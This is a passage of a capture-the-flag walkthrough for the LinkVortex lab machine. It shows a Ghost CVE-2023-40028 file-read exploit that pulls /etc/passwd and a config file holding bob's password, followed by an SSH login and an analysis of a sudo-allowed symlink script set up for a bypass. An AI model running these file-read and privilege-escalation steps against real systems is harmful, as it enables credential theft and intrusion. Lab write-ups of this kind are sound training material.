&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">daemon&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">daemon&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">nologin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>What other interresting files can we read ? Well, looking back at &lt;code>Dockerfile.ghost&lt;/code>, we find a config file path: &lt;code>/var/lib/ghost/config.production.json&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">Dockerfile&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ghost&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">FROM&lt;/span> &lt;span class="nx">ghost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mf">5.58.0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span> &lt;span class="nx">Copy&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">COPY&lt;/span> &lt;span class="nx">config&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">production&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">lib&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">production&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Reading this file via the CVE reveals the credentials of the user: &lt;code>bob&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">14
&lt;/span>&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">CVE&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2023&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">40028&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">admin&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">OctopiFociPilfer45&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">h&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//linkvortex.htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">WELCOME&lt;/span> &lt;span class="nx">TO&lt;/span> &lt;span class="nx">THE&lt;/span> &lt;span class="nx">CVE&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2023&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">40028&lt;/span> &lt;span class="nx">SHELL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Enter&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="nx">path&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nf">read&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">or&lt;/span> &lt;span class="kd">type&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">exit&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">quit&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">lib&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">production&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">File&lt;/span> &lt;span class="nx">content&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;mail&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;transport&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;SMTP&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;options&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;service&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;Google&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;host&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;linkvortex.htb&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;port&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">587&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;auth&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="s">&amp;#34;user&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;bob@linkvortex.htb&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="s">&amp;#34;pass&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;fibber-talented-worth&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>With these credentials, we canconnect via SSH the machine and retrieve the user flag.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">pwd&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bob&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="root">Root
&lt;/h2>&lt;h3 id="symlinks">Symlinks
&lt;/h3>&lt;p>Running &lt;code>sudo -l&lt;/code>, we find that bob can execute the script &lt;code>clean_symlink.sh&lt;/code> as root without a password:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="hl">&lt;span class="lnt">8
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">bob&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">use_pty&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">CHECK_CONTENT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">bob&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">ALL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">clean_symlink&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>If we take a look at second part of the script, we see that it checks for the presence of &lt;code>etc&lt;/code> or &lt;code>root&lt;/code> in the symlink target path. If such terms are detected, the link is deleted.&lt;br>
Otherwise, it is moved to &lt;code>/var/quarantined&lt;/code>, and if the environment variable &lt;code>CHECK_CONTENT&lt;/code> is set to true, the file content is displayed.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">clean_symlink&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="p">!&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">QUAR_DIR&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;/var/quarantined&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">z&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">CHECK_CONTENT&lt;/span> &lt;span class="p">];&lt;/span>&lt;span class="nx">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">CHECK_CONTENT&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="kc">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">LINK&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="s">&amp;#34;$LINK&amp;#34;&lt;/span> &lt;span class="p">=~&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="nx">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;! First argument must be a png file !&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">exit&lt;/span> &lt;span class="mi">2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">test&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">L&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">LINK&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">LINK_NAME&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">basename&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">LINK&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">LINK_TARGET&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">readlink&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">LINK&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;$LINK_TARGET&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Eq&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;! Trying to read critical files, removing link [ $LINK ] !&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">unlink&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">LINK&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;Link found [ $LINK ] , moving it to quarantine&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">mv&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">LINK&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">QUAR_DIR&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">CHECK_CONTENT&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">echo&lt;/span> &lt;span class="s">&amp;#34;Content:&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">cat&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">QUAR_DIR&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">LINK_NAME&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">dev&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">null&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">fi&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>We can use two approaches to bypass these checks and read the &lt;code>root.txt&lt;/code> file: nested symlinks or TOCTOU exploit.&lt;/p>
&lt;h3 id="method-1-nested-symlinks">Method 1: Nested symlinks
